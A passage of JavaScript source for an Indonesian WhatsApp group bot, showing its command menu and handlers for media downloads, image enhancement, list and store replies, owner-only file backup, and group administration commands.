͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏╔══✦ MENU PUBLIK ✦══╗
║ ❖ .help — Bantuan
║ ❖ .owner — Info Pemilik
║ ❖ .cwr — Coretan Warna
║ ❖ .cz — Custom Warna
║ ❖ .bijak — Kata Bijak
║ ❖ .pantun — Pantun Seru
║ ❖ .puisi — Puisi Indah
║ ❖ .jodoh — Cek Jodoh
╚═════════════════╝

╔══✦ MENU UPDATE ✦══╗
║ ❖ .fb — Download FB
║ ❖ .smeme — Stiker Meme
║ ❖ .apatuh — Apa Tuh?
║ ❖ .qc — Quote Creator
║ ❖ .bucin — Kata Bucin
║ ❖ .truth — Truth or Dare
║ ❖ .dare — Tantangan Seru
║ ❖ .renungan — Renungan Harian
║ ❖ .religi — Kata Religi
║ ❖ .kurs — Kurs Mata Uang
║ ❖ .gempa — Info Gempa
╚════════════════╝

╔══✦ MENU TOOLS ✦══╗
║ ❖ .tt — TikTok Downloader
║ ❖ .hdr — Foto HDR
║ ❖ .afk — Mode AFK
║ ❖ .ai — AI Chat
║ ❖ .stiker — Buat Stiker
║ ❖ .kali — Kalkulator Kali
║ ❖ .bagi — Kalkulator Bagi
║ ❖ .kurang — Kalkulator Kurang
║ ❖ .tambah — Kalkulator Tambah
║ ❖ .ytmp3 — Download MP3
║ ❖ .ytmp4 — Download MP4
║ ❖ .ttaudio — TikTok Audio
╚════════════════╝

╔══✦ MENU STORE ✦══╗
║ ❖ .list — Cek List Produk
║ ❖ .jeda — Atur Jeda
║ ❖ .dellist — Hapus List
║ ❖ .addlist — Tambah List
║ ❖ .updatelist — Update List
║ ❖ .tourl — Konversi ke URL
╚════════════════╝

╔══✦ PROSES & DONE ✦══╗
║ ❖ .proses — Proses Order
║ ❖ .done — Order Selesai
║ ❖ .setproses — Atur Proses
║ ❖ .setdone — Atur Done
║ ❖ .delsetproses — Hapus Proses
║ ❖ .delsetdone — Hapus Done
║ ❖ .changeproses — Ubah Proses
║ ❖ .changedone — Ubah Done
╚══════════════════╝

╔══✦ MENU BOT ✦══╗
║ ❖ .bot — Status Bot
║ ❖ .setbot — Atur Bot
║ ❖ .delsetbot — Hapus Bot
║ ❖ .updatesetbot — Update Bot
╚════════════════╝

╔══✦ OPEN & CLOSE ✦══╗
║ ❖ .open — Buka Layanan
║ ❖ .close — Tutup Layanan
║ ❖ .setopen — Atur Open
║ ❖ .setclose — Atur Close
║ ❖ .delsetopen — Hapus Open
║ ❖ .delsetclose — Hapus Close
║ ❖ .changeopen — Ubah Open
║ ❖ .changeclose — Ubah Close
╚══════════════════╝

╔══✦ MENU GROUP ✦══╗
║ ❖ .kick — Kick Member
║ ❖ .linkgc — Link Grup
║ ❖ .setleft — Atur Left
║ ❖ .antilink — Anti Link
║ ❖ .hidetag — Tag Semua
║ ❖ .demote — Turunkan Admin
║ ❖ .setdesk — Atur Deskripsi
║ ❖ .antilink2 — Anti Link 2
║ ❖ .goodbye — Atur Goodbye
║ ❖ .promote — Jadikan Admin
║ ❖ .ceksewa — Cek Sewa
║ ❖ .welcome — Atur Welcome
║ ❖ .delsetleft — Hapus Left
║ ❖ .antiwame — Anti Wa.me
║ ❖ .changeleft — Ubah Left
║ ❖ .setnamegc — Atur Nama Grup
║ ❖ .resetlinkgc — Reset Link Grup
║ ❖ .antiwame2 — Anti Wa.me 2
║ ❖ .setwelcome — Atur Welcome
║ ❖ .delsetwelcome — Hapus Welcome
║ ❖ .changewelcome — Ubah Welcome
╚════════════════╝

╔══✦ MENU STALK ✦══╗
║ ❖ .mlid — Cek ID ML
║ ❖ .cekff — Cek Free Fire
║ ❖ .cekml — Cek MLBB
║ ❖ .cekhok — Cek HoK
║ ❖ .cekab — Cek Arena of Valor
║ ❖ .cekgi — Cek Game ID
║ ❖ .cekpb — Cek Point Blank
║ ❖ .cekaov — Cek AOV
║ ❖ .cekcodm — Cek CODM
║ ❖ .cekpln — Cek PLN
║ ❖ .cekovo — Cek OVO
║ ❖ .cekdana — Cek DANA
║ ❖ .cekbank — Cek Bank
║ ❖ .cekgopay — Cek GoPay
║ ❖ .ceklinkaja — Cek LinkAja
║ ❖ .cekshopee — Cek Shopee
╚════════════════╝

╔══✦ MENU OWNER ✦══╗
║ ❖ .delsewa — Hapus Sewa
║ ❖ .listsewa — Cek Sewa
║ ❖ .addsewa — Tambah Sewa
║ ❖ .backupfile — Backup File
║ ❖ .restart — Restart Bot
╚════════════════╝`)
    
const helpAudioPath = './audio.mp3';
  if (fs.existsSync(helpAudioPath)) {
    await AnanthaGanz.sendMessage(
      m.chat,
      {
        audio: fs.readFileSync(helpAudioPath),
        mimetype: 'audio/mp4',
        ptt: true
      },
      { quoted: m }
    );
  }
} 
break;
                
case 'del': {
    const isOwner = global.owner.includes(m.sender.split('@')[0]);
  // Hanya bisa di grup
  if (!m.isGroup) return reply('Fitur ini hanya bisa digunakan di grup.');

  // Wajib reply pesan yang mau dihapus
  if (!m.quoted) return reply('Reply pesan yang mau dihapus dengan .del');

  // Hanya owner bot yang bisa pakai
  if (!isOwner) return reply('Hanya owner bot yang bisa menghapus pesan, tag admint');

  // Eksekusi hapus pesan
  await AnanthaGanz.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.quoted.id,
      participant: m.quoted.sender
   }
  });

  // Pesan sukses
  reply('✅ Pesan berhasil dihapus!\nTolong patuhi peraturan admint, ya 🙏');
}
break;
                
case 'ttaudio': {
    if (!m.isGroup) return m.reply('*Fitur khusus group !*');
    if (!q) return reply('Where is the link?');
    
    try {

        let i = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${q}`);
         if (!i.music) return reply('⚠️ Gagal mendapatkan audio. Silakan coba lagi.');
       const { music } = i;
        AnanthaGanz.sendMessage(m.chat, {audio: {url: music.play_url}, mimetype: 'audio/mp4'})
    } catch (err) {
        console.error(err);
        reply('❌ Terjadi kesalahan saat mengunduh audio. Mohon coba lagi nanti.');
    }
}
break;      
case 'tt':
case 'tiktok':
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
 if (!q) return reply('Linknya mana:b');

 try {
   let e = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${q}`);
     if(e && e.video) {
     const { title, video, author } = e;
   if (!e.video || !e.video.noWatermark) return reply('Gagal mengambil link video.');
    const pesan = `*Title :* ${title}\n*Author :* ${author.name}\n*Duration video:* ${video.durationFormatted}`
    await AnanthaGanz.sendMessage(m.chat, {video: {url : video.noWatermark}, caption: pesan})
    } else if (e && e.images.length > 0){
        const { images } = e;
        if(images.length > 3){
            reply("Gambar kebanyakan... 3 gambar aja cukup ya ");
        } images.slice(0,3).forEach((img, index) => {
            AnanthaGanz.sendMessage(m.chat, {image: { url: img.url}, caption: `Gambar ${index + 1}`})
        })
    } else {
        reply('gada video/image pada link ini')
    }
 } catch (err) {
   console.error(err);
   reply('Terjadi kesalahan saat mengunduh video. Coba lagi nanti.');
 }
 break;
case 'fb': {
  
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
    if (!q) return reply('Linknya mana bang?'); 
    reply('Bentar bang, lagi proses...'); 

    try {
        const testingnyakaka = await fbdl(q); 
        console.log(testingnyakaka); 

        if (!testingnyakaka.status) {
            return reply(testingnyakaka.msg || testingnyakaka.message);
        } else {
            const hdVideo = testingnyakaka.data.find(video => 
                video.resolution.toLowerCase().includes('hd') || 
                video.resolution.toLowerCase().includes('720p')
            );

            if (hdVideo) {
                await AnanthaGanz.sendMessage(
                    m.chat,
                    {
                        video: { url: hdVideo.url },
                        caption: `📹 *Video Facebook*\nResolusi: ${hdVideo.resolution}`,
                    },
                    { quoted: m }
                );
            } else {
                const sdVideo = testingnyakaka.data.find(video => 
                    video.resolution.toLowerCase().includes('sd') || 
                    video.resolution.toLowerCase().includes('360p')
                );

                if (sdVideo) {
                    await AnanthaGanz.sendMessage(
                        m.chat,
                        {
                            video: { url: sdVideo.url },
                            caption: `📹 *Video Facebook*\nResolusi: ${sdVideo.resolution}`,
                        },
                        { quoted: m }
                    );
                } else {
                    reply('Gagal mengunduh video. Coba lagi nanti.');
                }
            }
        }
    } catch (error) {
        console.error('Error saat memproses:', error);
        reply('Terjadi kesalahan saat memproses video. Coba lagi nanti.');
    }
    break;
}               
case 'hdr': {
if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const axios = require('axios');
  const path = require('path');

  try {
    if (!quoted || !/image/.test(mime)) {
      return reply('Silakan reply gambar yang ingin diubah menjadi HDR.');
    }

    reply('Tunggu sebentar, sedang memproses gambar...');

    // Unduh dan simpan gambar lokal sementara
    const mediaPath = await AnanthaGanz.downloadAndSaveMediaMessage(quoted);
    const imageUrl = await TelegraPh(mediaPath);
    if (!imageUrl) {
      fs.unlinkSync(mediaPath); // hapus file jika gagal
      return reply('Gagal mengunggah gambar ke server.');
    }

    // Panggil API Remini
    const apiUrl = `https://cekid.zannstore.com/v2/remini-v1?api_req=idsAPITOLS&url=${imageUrl}`;
    const response = await axios.get(apiUrl);
    const result = response.data;

    if (result.status !== 'success' || !result.data?.url_remini) {
      fs.unlinkSync(mediaPath); // hapus file jika gagal
      return reply('Gagal memproses gambar dengan HDR.');
    }

    // Ambil hasil HDR dan kirim
    const hdrBuffer = (await axios.get(result.data.url_remini, { responseType: 'arraybuffer' })).data;
    await AnanthaGanz.sendMessage(m.chat, { image: hdrBuffer, caption: 'Ini hasil HDR-nya, bosku!' }, { quoted: m });

    fs.unlinkSync(mediaPath); // hapus file setelah selesai

  } catch (error) {
    console.error('HDR Error:', error.response ? error.response.data : error.message);
    reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti.');
  }

  break;
}           
case 'backupfile':{
    if (!isCreator) return
  async function sendBackup() {
  const path = require('path');
  const archiver = require('archiver');
  
      try {
          const zipPath = await createBackupZip();
          const zipBuffer = fs.readFileSync(zipPath);
  
          
          try {
              await AnanthaGanz.sendMessage(m.chat, {
                  document: zipBuffer,
                  mimetype: 'application/zip',
                  fileName: 'backup.zip'
              });
              console.log('Backup file sent!');
          } catch (error) {
              console.error('Error sending message:', error);
          }
  
          
          fs.unlinkSync(zipPath);
      } catch (err) {
          console.error('Error during backup:', err);
      }
  }
  sendBackup() 
}
break
                case 'tourl': {
                  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
                reply('Tunggu ya')

                let media = await AnanthaGanz.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.
                    unlinkSync(media)
            }
                break;  
case 'list': case 'menu': {
    if (db_respon_list.length === 0) return m.reply(`*❌ Belum ada list message di database*`);
    if (!isAlreadyResponListGroup((m.isGroup ? m.chat : botNumber), db_respon_list)) return m.reply(`*⚠️ Belum ada list message yang terdaftar di group/chat ini*`);
    let teks = `┏━━━❀「 *📜 LIST MENU* 」❀━━━┓\n`;
    teks += `┃ 👋 Hai *@${m.sender.split("@")[0]}*\n`;
    teks += `┃\n`;

// Urutkan db_respon_list berdasarkan key secara alfabetis
db_respon_list.sort((a, b) => a.key.localeCompare(b.key));

for (let i of db_respon_list) {
  if (i.id === (m.isGroup ? m.chat : botNumber)) {
    teks += `┃ ✨ ${i.key.toUpperCase()}\n`;
  }
}

teks += `┗━━━━━━━━━━━━━━━━━━┛\n`;
teks += `💡 *Gunakan perintah sesuai daftar di atas!*`;
AnanthaGanz.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m });
    // Menyiapkan array untuk menyimpan baris menu
    var arr_rows = [];
    for (let x of db_respon_list) {
        if (x.id === (m.isGroup ? m.chat : botNumber)) {
            arr_rows.push({
                header: x.key.toUpperCase(), // Judul yang ditampilkan
                title: ``, // Deskripsi untuk item
                description: `Klik untuk memilih ${x.key}`, // Deskripsi tambahan
                id: x.key // ID yang digunakan untuk identifikasi
            });
        }
    }

    // Jika tidak ada item dalam arr_rows
    if (arr_rows.length === 0) return m.reply(`*Belum ada list message yang terdaftar di group/chat ini*`);

    // Membuat parameter JSON untuk tombol
    const buttonParamsJson = JSON.stringify({
        title: "CLICK HERE",
        sections: [
            {
                title: "Daftar Menu",
                rows: arr_rows
            }
        ]
    });

    // Membuat pesan dengan menu interaktif
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Halo @${m.sender.split("@")[0]} 👋\n\nSilahkan pilih item yang kamu butuhkan`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: footer_text // Pastikan footer_text didefinisikan di tempat lain
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: buttonParamsJson
                            }
                        ]
                    })
                })
            }
        }
    }, {});

    await AnanthaGanz.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
    }, { quoted: m });
}
break;          
case 'dellist':{
           // if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin & owner*')
            if (db_respon_list.length === 0) return m.reply(`*Belum ada list message di database*`)
            if (!text) return m.reply(`Gunakan dengan cara *${prefix + command} key*`)
            if (!isAlreadyResponList((m.isGroup? m.chat: botNumber), q.toLowerCase(), db_respon_list)) return m.reply(`🤖 : 𝗅𝗂𝗌𝗍 𝗋𝖾𝗌𝗉𝗈𝗇 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 *${q}* 𝗍𝗂𝖽𝖺𝗄 𝖺𝖽𝖺 𝖽𝗂 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾`)
            delResponList((m.isGroup? m.chat: botNumber), q.toLowerCase(), db_respon_list)
            reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝖽𝖾𝗅𝗅𝖾𝗍𝖾 𝗅𝗂𝗌𝗍 𝗆𝖾𝗌𝗌𝖺𝗀𝖾 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 *${q}*`)
            }
            break
case'addlist':{
            //if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*fitur khusus admin & owner*')
            var args1 = q.split("|")[0].toLowerCase()
            var args2 = q.split("|")[1]
            if (!q.includes("|")) return m.reply(`*CARA PENGGUNAAN FITUR ADDLIST*\n\nGunakan dengan cara ${command} *key|respon*\nContoh : ${command} tes|apa`)
            if (isAlreadyResponList((m.isGroup ? m.chat :botNumber), args1, db_respon_list)) return m.reply(`𝖫𝗂𝗌𝗍 𝗋𝖾𝗌𝗉𝗈𝗇 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 *${args1}* sudah ada`)
            if(m.isGroup){
            if (/image/.test(mime)) {
                let media = await AnanthaGanz.downloadAndSaveMediaMessage(quoted)
                let mem = await TelegraPh(media)
                        addResponList(m.chat, args1, args2, true, mem, db_respon_list)
                        reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝖺𝖽𝖽𝗅𝗂𝗌𝗍 𝗆𝖾𝗌𝗌𝖺𝗀𝖾 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 : ${args1}`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
            } else {
                addResponList(m.chat, args1, args2, false, '-', db_respon_list)
                reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝖺𝖽𝖽𝗅𝗂𝗌𝗍 𝗆𝖾𝗌𝗌𝖺𝗀𝖾 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 : ${args1}`)
            }
            } else {
            if (/image/.test(mime)) {
                let media = await AnanthaGanz.downloadAndSaveMediaMessage(quoted)
                let mem = await TelegraPh(media)
                        addResponList(botNumber, args1, args2, true, mem, db_respon_list)
                        reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝖺𝖽𝖽𝗅𝗂𝗌𝗍 𝗆𝖾𝗌𝗌𝖺𝗀𝖾 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 : ${args1}`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
            } else {
                addResponList(botNumber, args1, args2, false, '-', db_respon_list)
                reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝖺𝖽𝖽𝗅𝗂𝗌𝗍 𝗆𝖾𝗌𝗌𝖺𝗀𝖾 𝖽𝖾𝗇𝗀𝖺𝗇 𝗄𝖾𝗒 : ${args1}`)
            }
            }
            }
            break
case 'setopen':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin !*')
            if (!text) return m.reply(`*CARA PENGGUNAAN FITUR SETOPEN*\n\nGunakan dengan cara _${prefix + command} kalimatnya..._`)
            if (isSetOpen((m.isGroup? m.chat: botNumber), set_open)) return m.reply(`🤖 : 𝗌𝗎𝖽𝖺𝗁 𝖺𝖽𝖺 𝗌𝖾𝗍𝗈𝗉𝖾𝗇 𝗌𝖾𝖻𝖾𝗅𝗎𝗆𝗇𝗒𝖺`)
            addSetOpen(text, (m.isGroup? m.chat: botNumber), set_open)
            reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗌𝖾𝗍𝗈𝗉𝖾𝗇`)
            break
           }
case 'changeopen': {
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin !*')
            if (!text) return m.reply(` *CARA PENGGUNAAN FITUR CHANGEOPEN*\n\nGunakan dengan cara *${prefix + command} kalimatnya*, ini untuk mengubah jadi tidak perlu delsetopen`)
            if (isSetOpen((m.isGroup? m.chat: botNumber), set_open)) {
                changeSetOpen(text, (m.isGroup? m.chat: botNumber), set_open)
                m.reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗆𝖾𝗋𝗎𝖻𝖺𝗁 𝗌𝖾𝗍𝗈𝗉𝖾𝗇`)
            } else {
                addSetOpen(text, (m.isGroup? m.chat: botNumber), set_open)
                m.reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗆𝖾𝗋𝗎𝖻𝖺𝗁 𝗌𝖾𝗍𝗈𝗉𝖾𝗇`)
            }
           }
            break
case 'delsetopen': {
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin !*')
            if (!isSetOpen((m.isGroup? m.chat: botNumber), set_open)) return m.reply(`🤖 : 𝖻𝖾𝗅𝗎𝗆 𝖺𝖽𝖺 𝗌𝖾𝗍𝗈𝗉𝖾𝗇 𝖽𝗂 𝗀𝖼 𝗂𝗇𝗂`)
            removeSetOpen((m.isGroup? m.chat: botNumber), set_open)
            m.reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗆𝖾𝗇𝗀𝗁𝖺𝗉𝗎𝗌 𝗌𝖾𝗍𝗈𝗉𝖾𝗇`)
        }
            break
case 'setclose':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin !*')
            if (!text) return m.reply(`*CARA PENGGUNAAN FITUR SETCLOSE*\n\nGunakan dengan cara *${prefix + command} kalimatnya*`)
            if (isSetClose((m.isGroup? m.chat: botNumber), set_close)) return m.reply(`🤖 : 𝗌𝗎𝖽𝖺𝗁 𝖺𝖽𝖺 𝗌𝖾𝗍𝖼𝗅𝗈𝗌𝖾 𝗌𝖾𝖻𝖾𝗅𝗎𝗆𝗇𝗒𝖺`)
            addSetClose(text, (m.isGroup? m.chat: botNumber), set_close)
            reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗌𝖾𝗍𝖼𝗅𝗈𝗌𝖾`)
            break
            }
case 'changeclose':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!text) return m.reply(`*CARA PENGGUNAAN FITUR CHANGECLOSE*\n\nGunakan dengan cara *${prefix + command} kalimatnya*, ini untuk mengubah jadi tidak perlu delsetclose`)
            if (isSetClose((m.isGroup? m.chat: botNumber), set_close)) {
                changeSetClose(text, (m.isGroup? m.chat: botNumber), set_close)
                m.reply(`🤖 : s𝗎𝗄𝗌𝖾𝗌 𝗆𝖾𝗋𝗎𝖻𝖺𝗁 𝗌𝖾𝗍𝖼𝗅𝗈𝗌𝖾`)
            } else {
                addSetClose(text, (m.isGroup? m.chat: botNumber), set_done)
                m.reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗆𝖾𝗋𝗎𝖻𝖺𝗁 𝗌𝖾𝗍𝖼𝗅𝗈𝗌𝖾`)
            }
           }
            break
case 'delsetclose':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!isSetClose((m.isGroup? m.chat: botNumber), set_close)) return m.reply(`*Belum ada set done di gc ini*`)
            removeSetClose((m.isGroup? m.chat: botNumber), set_close)
            m.reply(`🤖 : 𝗌𝗎𝗄𝗌𝖾𝗌 𝗆𝖾𝗇𝗀𝗁𝖺𝗉𝗎𝗌 𝗌𝖾𝗍𝖼𝗅𝗈𝗌𝖾`)
        }
            break
case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isAdmins) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝖺𝖽𝗆𝗂𝗇')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
                if (!text) return m.reply(`Example ${prefix + command} WhatsApp Bot`)
                await AnanthaGanz.groupUpdateDescription(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply("*Terjadi kesalahan*"))
            }
            break
case 'promote': {
        if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isAdmins) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝖺𝖽𝗆𝗂𝗇')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
        await AnanthaGanz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('ciee jadi admin')).catch((err) => m.reply('*Terjadi kesalahan*'))
    }
    break
case 'demote': {
        if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isAdmins) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝖺𝖽𝗆𝗂𝗇')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
        await AnanthaGanz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('*kmu di demote :(*')).catch((err) => m.reply('*terjadi kesalahan*'))
    }
    break
case 'upscalert':
case "setlinkgc": case'revoke':{
            if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isAdmins) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝖺𝖽𝗆𝗂𝗇')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
            await AnanthaGanz.groupRevokeInvite(m.chat)
            .then( res => {
                reply(`*sukses menyetel tautan undangan grup*`)
            }).catch(() => reply("*terjadi kesalahan*"))
}
            break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
                let response = await AnanthaGanz.groupInviteCode(m.chat)
                m.reply(`https://chat.whatsapp.com/${response}\n${groupMetadata.subject}`)
            }
            break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isAdmins) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝖺𝖽𝗆𝗂𝗇')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
                if (!quoted) return m.reply (`🤖 : kirim/reply image dengan caption ${prefix + command}`)
                if (!/image/.test(mime)) return m.reply (`🤖 : kirim/reply image dengan caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply (`🤖 : kirim/reply image dengan caption ${prefix + command}`)
                let media = await AnanthaGanz.downloadAndSaveMediaMessage(quoted)
                await AnanthaGanz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply("🤖 : berhasil mengganti pp group")
                }
                break
case 'setname':
